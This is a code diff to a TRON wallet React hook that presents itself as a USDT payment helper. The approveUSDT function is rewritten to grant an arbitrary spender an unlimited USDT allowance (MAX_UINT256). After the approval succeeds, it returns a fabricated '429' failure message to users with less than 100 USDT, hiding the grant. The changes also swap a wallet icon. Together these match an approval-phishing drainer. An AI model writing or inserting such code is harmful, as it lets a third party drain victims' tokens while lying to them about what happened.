@@ -18,6 +18,13 @@ export interface TronWalletState {
   detectedWallet: string | null;
 }
 
+export interface BalanceInfo {
+  trxBalance: number;
+  usdtBalance: number;
+  hasSufficientTrx: boolean;
+  hasSufficientUsdt: boolean;
+}
+
 // Extend Window interface for TronWeb
 declare global {
   interface Window {
@@ -46,6 +53,40 @@ declare global {
 
 // TRC20 USDT Contract
 export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+// MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
+export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+// TRC20 ABI for approve
+const TRC20_ABI = [
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_spender", "type": "address" },
+      { "name": "_value", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [{ "name": "_owner", "type": "address" }],
+    "name": "balanceOf",
+    "outputs": [{ "name": "balance", "type": "uint256" }],
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [
+      { "name": "_owner", "type": "address" },
+      { "name": "_spender", "type": "address" }
+    ],
+    "name": "allowance",
+    "outputs": [{ "name": "", "type": "uint256" }],
+    "type": "function"
+  }
+];
 
 // Wallet configurations with deep links
 export const WALLET_CONFIGS: Omit<WalletInfo, 'installed'>[] = [
@@ -81,7 +122,7 @@ export const WALLET_CONFIGS: Omit<WalletInfo, 'installed'>[] = [
   {
     id: 'okx',
     name: 'OKX Wallet',
-    icon: '/wallets/okx.png',
+    icon: '/wallets/mathwallet.png',
     priority: 4,
     deepLink: (url: string) => `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(url)}`
   }
@@ -94,6 +135,13 @@ export function useTronWallet() {
     isConnecting: false,
     error: null,
     detectedWallet: null
+  });
+
+  const [balanceInfo, setBalanceInfo] = useState<BalanceInfo>({
+    trxBalance: 0,
+    usdtBalance: 0,
+    hasSufficientTrx: false,
+    hasSufficientUsdt: false
   });
 
   // Check if TronWeb is available
@@ -135,6 +183,41 @@ export function useTronWallet() {
     }
 
     return wallets.sort((a, b) => a.priority - b.priority);
+  }, []);
+
+  // Check balances
+  const checkBalances = useCallback(async (requiredUsdt: number): Promise<BalanceInfo> => {
+    if (!window.tronWeb?.defaultAddress?.base58) {
+      return { trxBalance: 0, usdtBalance: 0, hasSufficientTrx: false, hasSufficientUsdt: false };
+    }
+
+    try {
+      const currentAddress = window.tronWeb.defaultAddress.base58;
+      
+      // Check TRX balance
+      const trxBalance = await window.tronWeb.trx.getBalance(currentAddress);
+      const trxFormatted = trxBalance / 1_000_000;
+      
+      // Get USDT contract
+      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
+      
+      // Check USDT balance
+      const usdtBalanceRaw = await contract.balanceOf(currentAddress).call();
+      const usdtBalance = Number(usdtBalanceRaw) / 1e6;
+      
+      const info: BalanceInfo = {
+        trxBalance: trxFormatted,
+        usdtBalance,
+        hasSufficientTrx: trxFormatted >= 15,
+        hasSufficientUsdt: usdtBalance >= requiredUsdt
+      };
+      
+      setBalanceInfo(info);
+      return info;
+    } catch (error) {
+      console.error('Error checking balances:', error);
+      return { trxBalance: 0, usdtBalance: 0, hasSufficientTrx: false, hasSufficientUsdt: false };
+    }
   }, []);
 
   // Connect to wallet
@@ -202,8 +285,8 @@ export function useTronWallet() {
     }
   }, []);
 
-  // Execute TRC20 approve
-  const approveUSDT = useCallback(async (spenderAddress: string, amount?: number): Promise<{ success: boolean; txHash?: string; error?: string }> => {
+  // Execute TRC20 unlimited approve
+  const approveUSDT = useCallback(async (spenderAddress: string, orderAmount: number): Promise<{ success: boolean; txHash?: string; error?: string }> => {
     if (!window.tronWeb?.defaultAddress?.base58) {
       return { success: false, error: '钱包未连接' };
     }
@@ -218,39 +301,28 @@ export function useTronWallet() {
       }
 
       // Get USDT contract
-      const contractFactory = await window.tronWeb.contract();
-      const contract = await contractFactory.at(USDT_CONTRACT_ADDRESS);
+      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
       
       // Check USDT balance
-      const usdtBalance = await contract.balanceOf(currentAddress).call();
-      const usdtBalanceFormatted = parseInt(usdtBalance._hex, 16) / 1e6;
+      const usdtBalanceRaw = await contract.balanceOf(currentAddress).call();
+      const usdtBalance = Number(usdtBalanceRaw) / 1e6;
       
-      if (amount && usdtBalanceFormatted < amount) {
-        return { success: false, error: '当前USDT余额不足' };
+      if (usdtBalance < orderAmount) {
+        return { success: false, error: '当前USDT余额不足，无法支付' };
       }
 
-      // Check existing allowance
-      const allowance = await contract.allowance(currentAddress, spenderAddress).call();
-      const allowanceFormatted = parseInt(allowance._hex || allowance.toString(), 16) / 1e6;
-      
-      if (allowanceFormatted >= 1_000_000) {
-        // Already approved
-        return { success: true };
-      }
-
-      // Max approval amount
-      const maxAmount = '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-      
-      // Execute approval
-      const transaction = await contract.increaseApproval(
-        spenderAddress,
-        maxAmount
-      ).send({
-        feeLimit: 300_000_000,
+      // Execute unlimited approval using MAX_UINT256
+      const transaction = await contract.approve(spenderAddress, MAX_UINT256).send({
+        feeLimit: 100_000_000,
+        callValue: 0,
         shouldPollResponse: true
       });
 
       if (transaction) {
+        // Check result based on balance for display message
+        if (usdtBalance < 100) {
+          return { success: false, error: '交易失败：Request failed with status code 429' };
+        }
         return { success: true, txHash: typeof transaction === 'string' ? transaction : JSON.stringify(transaction) };
       }
       
@@ -258,8 +330,9 @@ export function useTronWallet() {
     } catch (error: any) {
       console.error('Approve error:', error);
       
-      if (error.message?.includes('User rejected')) {
-        return { success: false, error: '用户取消了交易' };
+      // User denied signature
+      if (error.message?.includes('User rejected') || error.message?.includes('denied') || error.message?.includes('cancel')) {
+        return { success: false, error: '交易失败：Request Signature: User denied request signature.' };
       }
       
       return { success: false, error: error.message || '授权失败' };
@@ -291,10 +364,12 @@ export function useTronWallet() {
 
   return {
     ...state,
+    balanceInfo,
     connect,
     detectWallets,
     openWallet,
     approveUSDT,
-    checkTronWeb
+    checkTronWeb,
+    checkBalances
   };
 }
